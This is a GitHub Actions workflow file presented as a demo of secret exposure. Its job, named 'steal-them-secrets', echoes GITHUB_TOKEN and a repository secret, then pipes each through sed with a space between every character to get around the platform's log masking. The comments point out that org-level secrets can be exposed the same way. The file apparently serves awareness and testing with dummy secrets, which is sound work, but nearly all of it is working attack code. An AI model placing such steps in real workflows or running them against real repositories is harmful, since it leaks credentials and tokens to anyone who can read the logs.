# DEMO: Shows how an attacker who can add or modify workflow files can
# expose GITHUB_TOKEN and repo (and org) secrets by printing them with
# character spacing to bypass log masking.
# Use only with dummy repo secrets in a test repo.

name: Workflow secrets exposure (demo)

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  steal-them-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: "[DEMO] Direct echo of GITHUB_TOKEN (masked by GitHub)"
        run: echo "Token:${{ secrets.GITHUB_TOKEN }}"

      - name: "[DEMO] Bypass masking - GITHUB_TOKEN char-by-char (visible in log)"
        run: |
          echo "Token with spaces between each char (recover by removing spaces):"
          echo "${{ secrets.GITHUB_TOKEN }}" | sed 's/./& /g'

      # Repo secret: add TOP_SECRET_SECRET in Settings â†’ Secrets for this repo
      # (use a dummy value). In a real attack the attacker uses actual secret names.
      - name: "[DEMO] Repo secret direct echo (masked)"
        run: echo "Repo secret:${{ secrets.TOP_SECRET_SECRET }}"

      - name: "[DEMO] Bypass masking - repo secret char-by-char"
        run: |
          echo "Repo secret with spaces:"
          echo "${{ secrets.TOP_SECRET_SECRET }}" | sed 's/./& /g'

      # Org-level secrets: if this repo has access to org secrets, a malicious
      # workflow can expose them the same way (echo with sed bypass).
